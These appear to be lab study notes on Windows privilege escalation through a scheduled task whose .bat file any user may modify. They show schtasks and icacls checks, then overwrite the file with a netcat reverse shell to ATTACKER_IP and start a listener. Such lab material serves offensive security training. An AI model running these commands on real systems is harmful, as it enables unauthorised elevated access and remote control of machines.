Priviledges Scheduled Tasks:
To retrieve detailed information about any of the service
-schtasks /query /tn vulntask /fo list /v

what matters for us is the ###"Task to Run"#### parameter which indicates what gets executed by the scheduled task, 
and the "Run As User" parameter, which shows the user that will be used to execute the task.

IF our current user can modify or overwrite the "Task to Run" executable:
we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. 
    To check the file permissions on the executable, we use "icacls":
    -icacls c:\tasks\taskName.bat

    Result:
    C:\> icacls c:\tasks\schtask.bat
    c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. 
This means we can modify the .bat file and insert any payload we like. 

For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
-echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

We then start a listener on the Our Kali machine on the same port we indicated on our reverse shell:
-nc -lvp 4444


The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges
